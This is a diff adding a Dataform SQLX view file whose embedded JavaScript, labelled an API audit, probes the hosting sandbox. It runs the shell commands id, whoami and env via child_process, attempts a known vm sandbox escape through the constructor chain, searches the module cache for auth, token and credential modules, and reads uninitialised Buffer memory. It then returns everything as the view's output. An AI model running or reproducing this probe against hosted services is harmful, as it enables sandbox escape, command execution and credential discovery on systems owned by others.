@@ -1,0 +1,412 @@
+config { type: "view", name: "node_api_audit" }
+
+js {
+  let results = {
+    probeTime: new Date().toISOString(),
+    purpose: "Audit of available Node.js APIs and globals"
+  };
+
+  // =============================================================================
+  // TEST 1: Global Objects Availability
+  // =============================================================================
+  results.test1_globals = {};
+  try {
+    const globals = {
+      // Core globals
+      process: typeof process,
+      global: typeof global,
+      globalThis: typeof globalThis,
+      console: typeof console,
+      Buffer: typeof Buffer,
+
+      // Module system
+      require: typeof require,
+      module: typeof module,
+      exports: typeof exports,
+      __dirname: typeof __dirname,
+      __filename: typeof __filename,
+
+      // Timers
+      setTimeout: typeof setTimeout,
+      setInterval: typeof setInterval,
+      setImmediate: typeof setImmediate,
+      clearTimeout: typeof clearTimeout,
+      clearInterval: typeof clearInterval,
+      clearImmediate: typeof clearImmediate,
+
+      // URL/Encoding
+      URL: typeof URL,
+      URLSearchParams: typeof URLSearchParams,
+      TextEncoder: typeof TextEncoder,
+      TextDecoder: typeof TextDecoder,
+      atob: typeof atob,
+      btoa: typeof btoa,
+
+      // Streams
+      ReadableStream: typeof ReadableStream,
+      WritableStream: typeof WritableStream,
+
+      // Crypto
+      crypto: typeof crypto,
+
+      // Fetch
+      fetch: typeof fetch,
+      Request: typeof Request,
+      Response: typeof Response,
+      Headers: typeof Headers
+    };
+
+    results.test1_globals = {
+      status: "completed",
+      globals,
+      hasRequire: typeof require === 'function',
+      hasProcess: typeof process === 'object',
+      hasFetch: typeof fetch === 'function'
+    };
+  } catch(e) {
+    results.test1_globals = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 2: Process Object Deep Dive
+  // =============================================================================
+  results.test2_process = {};
+  try {
+    if (typeof process === 'undefined') {
+      results.test2_process = { error: "process is undefined" };
+    } else {
+      const processInfo = {
+        // Version info
+        version: process.version,
+        versions: process.versions,
+        arch: process.arch,
+        platform: process.platform,
+
+        // Process info
+        pid: process.pid,
+        ppid: process.ppid,
+        title: process.title,
+        execPath: process.execPath,
+        execArgv: process.execArgv,
+        argv: process.argv,
+
+        // Working directory
+        cwd: typeof process.cwd === 'function' ? process.cwd() : null,
+
+        // Memory
+        memoryUsage: typeof process.memoryUsage === 'function' ? process.memoryUsage() : null,
+
+        // Features
+        features: process.features,
+
+        // Available methods
+        methods: Object.keys(process).filter(k => typeof process[k] === 'function')
+      };
+
+      // Check for dangerous methods
+      const dangerousMethods = {
+        binding: typeof process.binding,
+        _linkedBinding: typeof process._linkedBinding,
+        dlopen: typeof process.dlopen,
+        exit: typeof process.exit,
+        kill: typeof process.kill,
+        abort: typeof process.abort
+      };
+
+      results.test2_process = {
+        status: "completed",
+        processInfo,
+        dangerousMethods,
+        bindingAvailable: typeof process.binding === 'function'
+      };
+    }
+  } catch(e) {
+    results.test2_process = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 3: Require - Core Modules
+  // =============================================================================
+  results.test3_requireCore = {};
+  try {
+    if (typeof require !== 'function') {
+      results.test3_requireCore = { error: "require is not a function" };
+    } else {
+      const coreModules = {};
+
+      const modulesToTest = [
+        'fs', 'path', 'os', 'child_process', 'net', 'http', 'https',
+        'crypto', 'util', 'events', 'stream', 'buffer', 'url',
+        'querystring', 'assert', 'tty', 'dns', 'dgram', 'cluster',
+        'vm', 'v8', 'worker_threads', 'perf_hooks', 'async_hooks',
+        'inspector', 'readline', 'repl', 'zlib', 'module'
+      ];
+
+      for (const mod of modulesToTest) {
+        try {
+          const m = require(mod);
+          coreModules[mod] = {
+            available: true,
+            type: typeof m,
+            keys: Object.keys(m).slice(0, 10)
+          };
+        } catch(e) {
+          coreModules[mod] = {
+            available: false,
+            error: e.message.substring(0, 50)
+          };
+        }
+      }
+
+      results.test3_requireCore = {
+        status: "completed",
+        coreModules,
+        dangerousAvailable: {
+          child_process: coreModules.child_process?.available,
+          fs: coreModules.fs?.available,
+          net: coreModules.net?.available,
+          vm: coreModules.vm?.available
+        }
+      };
+    }
+  } catch(e) {
+    results.test3_requireCore = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 4: Child Process Execution
+  // =============================================================================
+  results.test4_childProcess = {};
+  try {
+    const cp = require('child_process');
+
+    const cpTests = {
+      execSync: null,
+      spawnSync: null,
+      exec: null
+    };
+
+    // Try execSync
+    try {
+      const result = cp.execSync('id', { encoding: 'utf8', timeout: 5000 });
+      cpTests.execSync = { success: true, output: result.substring(0, 200) };
+    } catch(e) {
+      cpTests.execSync = { success: false, error: e.message.substring(0, 100) };
+    }
+
+    // Try spawnSync
+    try {
+      const result = cp.spawnSync('whoami', { encoding: 'utf8', timeout: 5000 });
+      cpTests.spawnSync = {
+        success: result.status === 0,
+        stdout: result.stdout ? result.stdout.substring(0, 100) : null,
+        stderr: result.stderr ? result.stderr.substring(0, 100) : null
+      };
+    } catch(e) {
+      cpTests.spawnSync = { success: false, error: e.message.substring(0, 100) };
+    }
+
+    // Try reading sensitive data
+    try {
+      const env = cp.execSync('env', { encoding: 'utf8', timeout: 5000 });
+      cpTests.envDump = { success: true, lineCount: env.split('\n').length };
+    } catch(e) {
+      cpTests.envDump = { success: false, error: e.message.substring(0, 100) };
+    }
+
+    results.test4_childProcess = {
+      status: "completed",
+      cpTests,
+      commandExecutionPossible: cpTests.execSync?.success || cpTests.spawnSync?.success
+    };
+  } catch(e) {
+    results.test4_childProcess = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 5: VM Module (Sandbox Escape)
+  // =============================================================================
+  results.test5_vm = {};
+  try {
+    const vm = require('vm');
+
+    const vmTests = {
+      createContext: typeof vm.createContext,
+      runInContext: typeof vm.runInContext,
+      runInNewContext: typeof vm.runInNewContext,
+      runInThisContext: typeof vm.runInThisContext,
+      Script: typeof vm.Script
+    };
+
+    // Try to escape sandbox
+    let escapeAttempt = null;
+    try {
+      const code = `this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()`;
+      const result = vm.runInNewContext(code);
+      escapeAttempt = { success: true, output: result.substring(0, 100) };
+    } catch(e) {
+      escapeAttempt = { success: false, error: e.message.substring(0, 100) };
+    }
+
+    results.test5_vm = {
+      status: "completed",
+      vmTests,
+      escapeAttempt
+    };
+  } catch(e) {
+    results.test5_vm = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 6: Network Modules
+  // =============================================================================
+  results.test6_network = {};
+  try {
+    const networkTests = {};
+
+    // Test http
+    try {
+      const http = require('http');
+      networkTests.http = {
+        available: true,
+        methods: ['get', 'request', 'createServer'].filter(m => typeof http[m] === 'function')
+      };
+    } catch(e) {
+      networkTests.http = { available: false, error: e.message.substring(0, 50) };
+    }
+
+    // Test https
+    try {
+      const https = require('https');
+      networkTests.https = {
+        available: true,
+        methods: ['get', 'request', 'createServer'].filter(m => typeof https[m] === 'function')
+      };
+    } catch(e) {
+      networkTests.https = { available: false, error: e.message.substring(0, 50) };
+    }
+
+    // Test net
+    try {
+      const net = require('net');
+      networkTests.net = {
+        available: true,
+        methods: ['connect', 'createConnection', 'createServer'].filter(m => typeof net[m] === 'function')
+      };
+    } catch(e) {
+      networkTests.net = { available: false, error: e.message.substring(0, 50) };
+    }
+
+    // Test dns
+    try {
+      const dns = require('dns');
+      networkTests.dns = {
+        available: true,
+        methods: ['lookup', 'resolve', 'resolve4'].filter(m => typeof dns[m] === 'function')
+      };
+    } catch(e) {
+      networkTests.dns = { available: false, error: e.message.substring(0, 50) };
+    }
+
+    results.test6_network = {
+      status: "completed",
+      networkTests
+    };
+  } catch(e) {
+    results.test6_network = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 7: Require Cache Analysis
+  // =============================================================================
+  results.test7_requireCache = {};
+  try {
+    if (typeof require === 'undefined' || !require.cache) {
+      results.test7_requireCache = { error: "require.cache not available" };
+    } else {
+      const cache = require.cache;
+      const cachedModules = Object.keys(cache).map(k => ({
+        path: k,
+        filename: cache[k].filename,
+        loaded: cache[k].loaded
+      }));
+
+      // Look for interesting modules
+      const interestingModules = cachedModules.filter(m =>
+        /dataform|google|gcloud|auth|secret|token|cred/i.test(m.path)
+      );
+
+      results.test7_requireCache = {
+        status: "completed",
+        totalCached: cachedModules.length,
+        sampleModules: cachedModules.slice(0, 20),
+        interestingModules
+      };
+    }
+  } catch(e) {
+    results.test7_requireCache = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // TEST 8: Buffer Operations
+  // =============================================================================
+  results.test8_buffer = {};
+  try {
+    const bufferTests = {
+      BufferAvailable: typeof Buffer !== 'undefined',
+      allocUnsafe: typeof Buffer.allocUnsafe === 'function',
+      from: typeof Buffer.from === 'function'
+    };
+
+    // Try allocUnsafe (might leak memory)
+    if (bufferTests.allocUnsafe) {
+      try {
+        const buf = Buffer.allocUnsafe(1024);
+        const nonZero = Array.from(buf).filter(b => b !== 0).length;
+        bufferTests.allocUnsafeLeaksMemory = nonZero > 0;
+        bufferTests.nonZeroBytes = nonZero;
+      } catch(e) {
+        bufferTests.allocUnsafeError = e.message.substring(0, 50);
+      }
+    }
+
+    results.test8_buffer = {
+      status: "completed",
+      bufferTests
+    };
+  } catch(e) {
+    results.test8_buffer = { error: e.message.substring(0, 200) };
+  }
+
+  // =============================================================================
+  // SUMMARY
+  // =============================================================================
+  results.summary = {
+    testsRun: 8,
+    allCompleted: Object.keys(results).filter(k =>
+      k.startsWith("test") && results[k].status === "completed"
+    ).length,
+    criticalFindings: []
+  };
+
+  // Check for critical findings
+  if (results.test4_childProcess && results.test4_childProcess.commandExecutionPossible) {
+    results.summary.criticalFindings.push("COMMAND EXECUTION POSSIBLE via child_process!");
+  }
+
+  if (results.test5_vm && results.test5_vm.escapeAttempt && results.test5_vm.escapeAttempt.success) {
+    results.summary.criticalFindings.push("VM SANDBOX ESCAPE SUCCESSFUL!");
+  }
+
+  if (results.test3_requireCore) {
+    const dangerous = results.test3_requireCore.dangerousAvailable || {};
+    if (dangerous.child_process) {
+      results.summary.criticalFindings.push("child_process module available");
+    }
+    if (dangerous.fs) {
+      results.summary.criticalFindings.push("fs module available");
+    }
+  }
+}
+
+SELECT '${JSON.stringify(results, null, 2)}' as node_api_audit
